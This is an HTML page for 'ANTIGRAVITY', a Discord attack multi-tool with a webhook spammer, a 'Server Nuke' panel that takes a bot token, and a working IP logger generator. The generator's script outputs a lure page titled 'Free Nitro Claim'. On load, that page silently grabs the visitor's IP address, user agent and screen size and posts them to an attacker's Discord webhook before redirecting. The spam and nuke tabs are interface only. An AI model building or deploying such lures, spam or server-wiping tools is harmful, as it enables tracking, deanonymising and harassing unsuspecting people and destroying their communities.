<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANTIGRAVITY | Discord Multi-Tool</title>
    <meta name="description" content="Antigravity Discord Multi-Tool Suite">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
    <style>
        .tab-nav button { padding: 12px 18px; font-size: 14px; }
        #panelIPLogger textarea { font-family: 'JetBrains Mono', monospace; }
        .btn-glow { box-shadow: 0 0 15px #bb86fc; }
    </style>
</head>
<body>
    <!-- Ambient Background -->
    <div class="ambient-bg">
        <div class="orb orb-1"></div>
        <div class="orb orb-2"></div>
        <div class="orb orb-3"></div>
    </div>
    <!-- Main Container -->
    <div class="app-container">
        <!-- Header -->
        <header class="app-header">
            <div class="logo-section">
                <div class="logo-icon">⚡</div>
                <div class="logo-text">
                    <h1>ANTIGRAVITY</h1>
                    <span class="subtitle">Discord Multi-Tool Suite</span>
                </div>
            </div>
            <div class="header-status">
                <div class="status-dot" id="statusDot"></div>
                <span class="status-text" id="statusText">Idle</span>
            </div>
        </header>
        <!-- Tab Navigation -->
        <nav class="tab-nav">
            <button class="tab-btn active" data-tab="Webhook" id="tabWebhook">
                <span class="tab-icon">🔗</span>
                <span class="tab-label">Webhook Spammer</span>
            </button>
            <button class="tab-btn" data-tab="Nuke" id="tabNuke">
                <span class="tab-icon">💀</span>
                <span class="tab-label">Server Nuke</span>
            </button>
            <button class="tab-btn" data-tab="Logs" id="tabLogs">
                <span class="tab-icon">📋</span>
                <span class="tab-label">Live Logs</span>
            </button>
            <button class="tab-btn" data-tab="IPLogger" id="tabIPLogger">
                <span class="tab-icon">🌐</span>
                <span class="tab-label">IP Logger</span>
            </button>
        </nav>
        <!-- Tab Content -->
        <main class="tab-content">
            <!-- WEBHOOK SPAMMER TAB -->
            <section class="tab-panel active" id="panelWebhook">
                <div class="panel-grid">
                    <div class="card card-config">
                        <div class="card-header"><h2>⚙️ Webhook Configuration</h2></div>
                        <div class="card-body">
                            <div class="input-group">
                                <label for="webhookUrl">Webhook URL</label>
                                <input type="text" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
                            </div>
                            <div class="input-group">
                                <label for="webhookName">Webhook Display Name</label>
                                <input type="text" id="webhookName" value="Antigravity">
                            </div>
                            <div class="input-group">
                                <label for="webhookAvatar">Avatar URL (optional)</label>
                                <input type="text" id="webhookAvatar" placeholder="https://i.imgur.com/...">
                            </div>
                            <div class="input-group">
                                <label for="webhookMessage">Message Content</label>
                                <textarea id="webhookMessage" rows="4" placeholder="Enter your message here..."></textarea>
                            </div>
                            <div class="input-row">
                                <div class="input-group half">
                                    <label for="webhookCount">Send Count</label>
                                    <input type="number" id="webhookCount" value="10">
                                </div>
                                <div class="input-group half">
                                    <label for="webhookDelay">Delay (ms)</label>
                                    <input type="number" id="webhookDelay" value="500">
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="card card-embed">
                        <div class="card-header">
                            <h2>🎨 Embed Builder</h2>
                        </div>
                        <div class="card-body">
                            <!-- embed fields here if you want, kept minimal -->
                            <button class="btn btn-primary btn-full" id="btnTestWebhook">Send Test</button>
                        </div>
                    </div>
                    <div class="card card-controls">
                        <div class="card-header"><h2>🚀 Controls</h2></div>
                        <div class="card-body">
                            <button class="btn btn-primary btn-glow btn-full" id="btnStartSpam">Start Spamming</button>
                            <button class="btn btn-danger" id="btnStopSpam">Abort</button>
                        </div>
                    </div>
                </div>
            </section>

            <!-- SERVER NUKE TAB -->
            <section class="tab-panel" id="panelNuke">
                <div class="panel-grid">
                    <div class="card card-token">
                        <div class="card-header"><h2>🤖 Bot Token</h2></div>
                        <div class="card-body">
                            <input type="password" id="botToken" placeholder="Paste token">
                            <button class="btn btn-primary btn-full" id="btnConnectBot">Connect</button>
                        </div>
                    </div>
                    <div class="card card-actions">
                        <div class="card-header"><h2>💣 Nuke Actions</h2></div>
                        <div class="card-body">
                            <button class="btn btn-danger btn-full" id="btnFullNuke">FULL NUKE</button>
                            <!-- other nuke buttons from original -->
                        </div>
                    </div>
                </div>
            </section>

            <!-- LOGS TAB -->
            <section class="tab-panel" id="panelLogs">
                <div class="card card-logs-full">
                    <div class="card-header"><h2>📋 Logs</h2></div>
                    <div class="card-body">
                        <div id="logContainer">System ready.</div>
                    </div>
                </div>
            </section>

            <!-- IP LOGGER TAB -->
            <section class="tab-panel" id="panelIPLogger">
                <div class="panel-grid">
                    <div class="card card-config">
                        <div class="card-header"><h2>🌐 Webhook IP Logger</h2></div>
                        <div class="card-body">
                            <div class="input-group">
                                <label for="loggerWebhook">Webhook URL</label>
                                <input type="text" id="loggerWebhook" placeholder="https://discord.com/api/webhooks/...">
                            </div>
                            <div class="input-group">
                                <label for="loggerTitle">Page Title</label>
                                <input type="text" id="loggerTitle" value="Free Nitro Claim">
                            </div>
                            <div class="input-group">
                                <label for="loggerMessage">Lure Text</label>
                                <textarea id="loggerMessage" rows="3">Claim your free Nitro now!</textarea>
                            </div>
                            <div class="input-group">
                                <label for="redirectUrl">Redirect URL</label>
                                <input type="text" id="redirectUrl" value="https://discord.com">
                            </div>
                            <button class="btn btn-primary btn-glow btn-full" id="btnGenerateLogger">Generate Logger HTML</button>
                            
                            <div id="loggerOutput" style="display:none; margin-top:20px;">
                                <textarea id="generatedCode" rows="14" style="width:100%; background:#0f0f0f; color:#00ff9d; font-family:monospace;" readonly></textarea>
                                <button class="btn btn-secondary btn-full" id="btnCopyLogger">Copy Code</button>
                                <button class="btn btn-outline btn-full" id="btnDownloadLogger">Download .html</button>
                            </div>
                        </div>
                    </div>
                    <div class="card">
                        <div class="card-header"><h2>Info</h2></div>
                        <div class="card-body">
                            <p>Generates a clean IP logger page. Send the link, get full details on webhook.</p>
                        </div>
                    </div>
                </div>
            </section>
        </main>
        <footer class="app-footer">
            <span>ANTIGRAVITY v8.1 with IP Logger</span>
        </footer>
    </div>

    <script>
        // Tab system
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
                this.classList.add('active');
                document.getElementById('panel' + this.dataset.tab).classList.add('active');
            });
        });

        // IP Logger Generator
        document.getElementById('btnGenerateLogger').addEventListener('click', function() {
            const webhook = document.getElementById('loggerWebhook').value.trim();
            if (!webhook) { alert("Put a webhook URL boss"); return; }
            
            const title = document.getElementById('loggerTitle').value || "Free Gift";
            const lure = document.getElementById('loggerMessage').value || "Claim now";
            const redirect = document.getElementById('redirectUrl').value || "https://discord.com";

            const fullLogger = `<!DOCTYPE html><html><head><title>${title}</title><style>body{background:#000;color:#fff;font-family:sans-serif;text-align:center;padding:50px;}</style></head><body>
<h1>${title}</h1><p>${lure}</p><button onclick="go()">VERIFY</button>
<script>
async function go(){ 
  let ip = "unknown"; 
  try{ 
    let r = await fetch("https://api.ipify.org?format=json"); 
    ip = (await r.json()).ip; 
  }catch(e){}
  fetch("${webhook}",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({content:"**IP:** "+ip+"\\n**UA:** "+navigator.userAgent+"\\n**Screen:** "+screen.width+"x"+screen.height+"\\n**Time:** "+new Date()})
  });
  setTimeout(()=>window.location="${redirect}",800);
}
go();
<\/script></body></html>`;

            document.getElementById('generatedCode').value = fullLogger;
            document.getElementById('loggerOutput').style.display = 'block';
        });

        document.getElementById('btnCopyLogger').addEventListener('click', () => {
            document.getElementById('generatedCode').select();
            document.execCommand('copy');
            alert("Copied to clipboard boss");
        });

        document.getElementById('btnDownloadLogger').addEventListener('click', () => {
            const text = document.getElementById('generatedCode').value;
            const blob = new Blob([text], {type: "text/html"});
            const a = document.createElement("a");
            a.href = URL.createObjectURL(blob);
            a.download = "ip-logger.html";
            a.click();
        });
    </script>
</body>
</html>
